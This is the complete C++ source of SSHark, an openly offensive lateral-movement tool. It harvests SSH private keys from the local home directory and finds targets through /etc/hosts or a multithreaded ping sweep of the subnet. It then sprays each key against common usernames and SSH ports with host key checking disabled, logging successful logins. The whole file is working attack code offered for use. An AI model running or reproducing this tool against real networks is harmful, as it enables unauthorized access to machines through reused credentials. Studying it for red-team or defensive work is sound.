/*
SSHark v1.0
Author: c0d3Ninja

Try discovered SSH keys against other hosts in the subnet. Automate lateral movement via SSH key reuse.

Features:
- Find all SSH private keys (~/.ssh/id_rsa, id_dsa, id_ecdsa, id_ed25519)
- Find hosts in /etc/hosts file (--hostnames mode)
- Find hosts in local subnet via ping sweep (--ip mode)
- Attempt SSH connections with found keys
- Use multiple threads for fast scanning
- Test common usernames (root, admin, ubuntu, ec2-user, user)
- Test common SSH ports (22, 2222, 2200, 22000)
- Log successful authentications with color-coded output
 */

#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <thread>
#include <mutex>
#include <atomic>
#include "./modules/parsers.h"
#include "./modules/readfile.h"
#include "./modules/executils.h"
#include "./modules/portscanner.h"


#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define BOLD    "\033[1m"
#define UNDERLINE "\033[4m"

std::vector<std::string> findSSHKeys(const std::vector<std::string>& customPaths = {}) {
    std::vector<std::string> sshKeys;
    
    std::vector<std::string> sshPaths = customPaths.empty() 
        ? std::vector<std::string>{"~/.ssh/id_rsa", "~/.ssh/id_dsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519"}
        : customPaths;
    
    for (const auto& path : sshPaths) {
        if (checkPaths(path) == 1) {
            sshKeys.push_back(expandPath(path));
        }
    }
    return sshKeys;
}


std::vector<std::string> findHostsFromFile() {
    std::vector<std::string> hosts;
    if (checkPaths("/etc/hosts") == 1) {
        std::string content = readFile("/etc/hosts");
        std::istringstream stream(content);
        std::string line;
        while (std::getline(stream, line)) {
            size_t start = line.find_first_not_of(" \t");
            if (start == std::string::npos) continue;
            
            if (line[start] == '#') continue;
            
            std::istringstream lineStream(line);
            std::string ip;
            if (lineStream >> ip) {
                if (ip[0] == '#') continue;
                
                if (ip == "127.0.0.1" || ip == "::1" || ip == "127.0.1.1" ||
                    ip == "255.255.255.255" || ip == "0.0.0.0" ||
                    ip.find('.') == std::string::npos) {
                    continue;
                }
                hosts.push_back(ip);
            }
        }
    }
    return hosts;
}

bool isHostUp(const std::string& ip) {
    std::string pingCmd = "ping -c 1 -W 500 " + ip + " >/dev/null 2>&1";
    int result = std::system(pingCmd.c_str());
    return result == 0;
}

std::string getLocalIP() {
    std::string result = execCommand("ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -n 1");
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }
    return result;
}

std::string getSubnetBase(const std::string& ip) {
    size_t lastDot = ip.find_last_of('.');
    if (lastDot == std::string::npos) return "";
    return ip.substr(0, lastDot + 1);
}

std::vector<std::string> scanSubnet(const std::string& baseIP) {
    std::vector<std::string> liveHosts;
    std::mutex hostsMutex;
    std::atomic<int> scannedCount(0);
    
    std::cout << CYAN << "Scanning subnet " << baseIP << "0/24 for live hosts..." << RESET << "\n";
    std::cout << YELLOW << "Using " << std::thread::hardware_concurrency() << " threads for fast scanning..." << RESET << "\n";
    
    auto scanWorker = [&](int start, int end) {
        for (int i = start; i < end; ++i) {
            std::string ip = baseIP + std::to_string(i);
            
            if (isHostUp(ip)) {
                std::lock_guard<std::mutex> lock(hostsMutex);
                liveHosts.push_back(ip);
                std::cout << GREEN << "  [+] Found live host: " << ip << RESET << "\n";
            }
            
            int current = ++scannedCount;
            if (current % 25 == 0) {
                std::lock_guard<std::mutex> lock(hostsMutex);
                std::cout << CYAN << "  Progress: " << current << "/254 IPs scanned..." << RESET << "\n";
            }
        }
    };
    
    const int numThreads = 50;
    std::vector<std::thread> threads;
    int ipsPerThread = 254 / numThreads;
    
    for (int t = 0; t < numThreads; ++t) {
        int start = 1 + (t * ipsPerThread);
        int end = (t == numThreads - 1) ? 255 : start + ipsPerThread;
        threads.emplace_back(scanWorker, start, end);
    }
    
    for (auto& thread : threads) {
        thread.join();
    }
    
    std::cout << GREEN << "\nSubnet scan complete! Found " << liveHosts.size() << " live hosts." << RESET << "\n";
    return liveHosts;
}

std::vector<int> checkSSHPorts(const std::string& ip, const std::vector<int>& customPorts = {}) {
    std::vector<int> sshPorts;
    
    std::vector<int> portsToCheck = customPorts.empty() 
        ? std::vector<int>{22, 2222, 2200, 22000}
        : customPorts;
    
    std::mutex portsMutex;
    
    std::cout << CYAN << "Checking SSH ports on " << ip << "..." << RESET << "\n";
    
    std::vector<std::thread> threads;
    for (int port : portsToCheck) {
        threads.emplace_back([&, port]() {
            if (isPortOpen(ip, port)) {
                std::lock_guard<std::mutex> lock(portsMutex);
                sshPorts.push_back(port);
                std::cout << GREEN << "  Port " << port << " is open" << RESET << "\n";
            }
        });
    }
    
    for (auto& thread : threads) {
        thread.join();
    }
    
    return sshPorts;
}


void trySSHKeys(const std::vector<std::string>& sshKeys, const std::vector<std::string>& hosts, const std::vector<int>& customPorts = {}) {
    std::vector<std::string> usernames = {"root", "admin", "ubuntu", "ec2-user", "user"};
    std::mutex outputMutex;
    
    struct SSHAttempt {
        std::string host;
        int port;
        std::string key;
        std::string username;
    };
    std::vector<SSHAttempt> attempts;
    
    for (const auto& host : hosts) {
        {
            std::lock_guard<std::mutex> lock(outputMutex);
            std::cout << BOLD << YELLOW << "\n[*] Testing host: " << host << RESET << "\n";
            std::cout << CYAN << "Checking if host is up..." << RESET << "\n";
        }
        
        if (!isHostUp(host)) {
            std::lock_guard<std::mutex> lock(outputMutex);
            std::cout << RED << "Host is down, skipping." << RESET << "\n";
            continue;
        }
        
        {
            std::lock_guard<std::mutex> lock(outputMutex);
            std::cout << GREEN << "Host is up!" << RESET << "\n";
        }
        
        std::vector<int> sshPorts = checkSSHPorts(host, customPorts);
        
        if (sshPorts.empty()) {
            std::lock_guard<std::mutex> lock(outputMutex);
            std::cout << RED << "No SSH ports open on " << host << RESET << "\n";
            continue;
        }
        
        for (const auto& port : sshPorts) {
            for (const auto& key : sshKeys) {
                for (const auto& username : usernames) {
                    attempts.push_back({host, port, key, username});
                }
            }
        }
    }
    
    if (attempts.empty()) {
        std::cout << RED << "\n[!] No SSH attempts to make." << RESET << "\n";
        return;
    }
    
    {
        std::lock_guard<std::mutex> lock(outputMutex);
        std::cout << BOLD << CYAN << "\n[*] Testing " << attempts.size() 
                  << " SSH key/username combinations across all hosts..." << RESET << "\n";
        std::cout << YELLOW << "Using parallel connections for speed..." << RESET << "\n";
    }
    
    auto testSSH = [&](const SSHAttempt& attempt) {
        {
            std::lock_guard<std::mutex> lock(outputMutex);
            std::cout << BLUE << "  Trying " << attempt.username << "@" << attempt.host << ":" 
                      << attempt.port << " with key " << attempt.key << RESET << "\n";
        }
        
        std::string command = "ssh -i " + attempt.key + 
                            " -o StrictHostKeyChecking=no" +
                            " -o UserKnownHostsFile=/dev/null" +
                            " -o ConnectTimeout=5" +
                            " -o ServerAliveInterval=2" +
                            " -o ServerAliveCountMax=2" +
                            " -o BatchMode=yes" +
                            " -o PasswordAuthentication=no" +
                            " -p " + std::to_string(attempt.port) +
                            " " + attempt.username + "@" + attempt.host +
                            " 'echo SUCCESS' 2>&1";
        
        std::string result = execCommand(command);
        
        std::lock_guard<std::mutex> lock(outputMutex);
        if (result.find("SUCCESS") != std::string::npos) {
            std::cout << BOLD << GREEN << "✓ AUTHENTICATED: " << attempt.username 
                      << "@" << attempt.host << ":" << attempt.port << " with key " 
                      << attempt.key << RESET << "\n";
        } else if (result.find("Permission denied") != std::string::npos) {
        } else if (!result.empty()) {
            std::cout << YELLOW << "    Result: " << result << RESET << "\n";
        }
    };
    
    const int batchSize = 10;
    for (size_t i = 0; i < attempts.size(); i += batchSize) {
        std::vector<std::thread> threads;
        size_t end = std::min(i + batchSize, attempts.size());
        
        for (size_t j = i; j < end; ++j) {
            threads.emplace_back(testSSH, attempts[j]);
        }
        
        for (auto& thread : threads) {
            thread.join();
        }
    }
}

void printUsage(const char* progName) {
    std::cout << BOLD << "Usage: " << progName << " [MODE] [OPTIONS]" << RESET << "\n\n";
    std::cout << "Modes:\n";
    std::cout << "  " << GREEN << "--ip" << RESET << "          Scan local subnet for live hosts\n";
    std::cout << "  " << GREEN << "--hostnames" << RESET << "   Use /etc/hosts file for target hosts\n\n";
    std::cout << "Options:\n";
    std::cout << "  " << GREEN << "--keys" << RESET << " <paths>     Comma-separated SSH key paths (default: ~/.ssh/id_*)\n";
    std::cout << "  " << GREEN << "--ports" << RESET << " <ports>    Comma-separated SSH ports (default: 22,2222,2200,22000)\n";
    std::cout << "  " << GREEN << "--help" << RESET << "             Show this help message\n\n";
    std::cout << "Examples:\n";
    std::cout << "  " << CYAN << progName << " --ip" << RESET << "\n";
    std::cout << "  " << CYAN << progName << " --hostnames --keys ~/.ssh/my_key,/tmp/key" << RESET << "\n";
    std::cout << "  " << CYAN << progName << " --ip --ports 22,2222 --keys ~/.ssh/id_rsa" << RESET << "\n\n";
}

int main(int argc, char* argv[]) {
    std::cout << BOLD << CYAN << R"(

  ██████   ██████  ██░ ██  ▄▄▄       ██▀███   ██ ▄█▀
▒██    ▒ ▒██    ▒ ▓██░ ██▒▒████▄    ▓██ ▒ ██▒ ██▄█▒ 
░ ▓██▄   ░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ 
  ▒   ██▒  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ 
▒██████▒▒▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄
▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
░ ░▒  ░ ░░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░
░  ░  ░  ░  ░  ░   ░  ░░ ░  ░   ▒     ░░   ░ ░ ░░ ░ 
      ░        ░   ░  ░  ░      ░  ░   ░     ░  ░                   
                \_____)\_____
                /--v____ __`<     Author: c0d3Ninja    
                        )/        Version: 1.0
                        '
                          
    )" << RESET << "\n";
    
    std::string mode = "";
    std::vector<std::string> customKeyPaths;
    std::vector<int> customPorts;
    
    if (argc < 2) {
        std::cout << RED << "[!] Error: No mode specified." << RESET << "\n\n";
        printUsage(argv[0]);
        return 1;
    }
    
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        
        if (arg == "--help" || arg == "-h") {
            printUsage(argv[0]);
            return 0;
        } else if (arg == "--ip") {
            mode = "ip";
        } else if (arg == "--hostnames") {
            mode = "hostnames";
        } else if (arg == "--keys") {
            if (i + 1 >= argc) {
                std::cout << RED << "[!] Error: --keys requires an argument" << RESET << "\n\n";
                printUsage(argv[0]);
                return 1;
            }
            std::string keysArg = argv[++i];
            std::istringstream ss(keysArg);
            std::string path;
            while (std::getline(ss, path, ',')) {
                customKeyPaths.push_back(path);
            }
        } else if (arg == "--ports") {
            if (i + 1 >= argc) {
                std::cout << RED << "[!] Error: --ports requires an argument" << RESET << "\n\n";
                printUsage(argv[0]);
                return 1;
            }
            std::string portsArg = argv[++i];
            std::istringstream ss(portsArg);
            std::string portStr;
            while (std::getline(ss, portStr, ',')) {
                try {
                    int port = std::stoi(portStr);
                    if (port > 0 && port <= 65535) {
                        customPorts.push_back(port);
                    } else {
                        std::cout << YELLOW << "[!] Warning: Skipping invalid port " << portStr << RESET << "\n";
                    }
                } catch (...) {
                    std::cout << YELLOW << "[!] Warning: Skipping invalid port " << portStr << RESET << "\n";
                }
            }
        } else {
            std::cout << RED << "[!] Error: Unknown option '" << arg << "'" << RESET << "\n\n";
            printUsage(argv[0]);
            return 1;
        }
    }
    
    if (mode.empty()) {
        std::cout << RED << "[!] Error: No mode specified (--ip or --hostnames)" << RESET << "\n\n";
        printUsage(argv[0]);
        return 1;
    }
    
    if (!customKeyPaths.empty()) {
        std::cout << CYAN << "[*] Using custom SSH key paths:" << RESET << "\n";
        for (const auto& path : customKeyPaths) {
            std::cout << "  - " << path << "\n";
        }
    }
    
    if (!customPorts.empty()) {
        std::cout << CYAN << "[*] Using custom SSH ports: ";
        for (size_t i = 0; i < customPorts.size(); ++i) {
            std::cout << customPorts[i];
            if (i < customPorts.size() - 1) std::cout << ", ";
        }
        std::cout << RESET << "\n";
    }
    
    std::cout << YELLOW << "\n[*] Finding SSH keys..." << RESET << "\n";
    std::vector<std::string> sshKeys = findSSHKeys(customKeyPaths);
    std::cout << GREEN << "Found " << sshKeys.size() << " SSH keys" << RESET << "\n";
    for (const auto& key : sshKeys) {
        std::cout << "  - " << key << "\n";
    }
    
    if (sshKeys.empty()) {
        std::cout << RED << "\n[!] No SSH keys found. Exiting." << RESET << "\n";
        return 1;
    }
    
    std::vector<std::string> hosts;
    
    if (mode == "ip") {
        std::cout << YELLOW << "\n[*] Getting local IP address..." << RESET << "\n";
        std::string localIP = getLocalIP();
        
        if (localIP.empty()) {
            std::cout << RED << "[!] Could not determine local IP address." << RESET << "\n";
            return 1;
        }
        
        std::cout << GREEN << "Local IP: " << localIP << RESET << "\n";
        
        std::string subnetBase = getSubnetBase(localIP);
        if (subnetBase.empty()) {
            std::cout << RED << "[!] Could not determine subnet." << RESET << "\n";
            return 1;
        }
        
        std::cout << YELLOW << "\n[*] Scanning subnet for live hosts..." << RESET << "\n";
        hosts = scanSubnet(subnetBase);
        
    } else if (mode == "hostnames") {
        std::cout << YELLOW << "\n[*] Finding hosts from /etc/hosts..." << RESET << "\n";
        hosts = findHostsFromFile();
        std::cout << GREEN << "Found " << hosts.size() << " hosts from /etc/hosts" << RESET << "\n";
        for (const auto& host : hosts) {
            std::cout << "  - " << host << "\n";
        }
    }
    
    if (hosts.empty()) {
        std::cout << RED << "\n[!] No hosts found. Exiting." << RESET << "\n";
        return 1;
    }
    
    std::cout << YELLOW << "\n[*] Starting SSH key spray attack on " << hosts.size() << " hosts..." << RESET << "\n";
    trySSHKeys(sshKeys, hosts, customPorts);
    
    std::cout << BOLD << CYAN << "\nScan Completed" << RESET << "\n";
    return 0;
}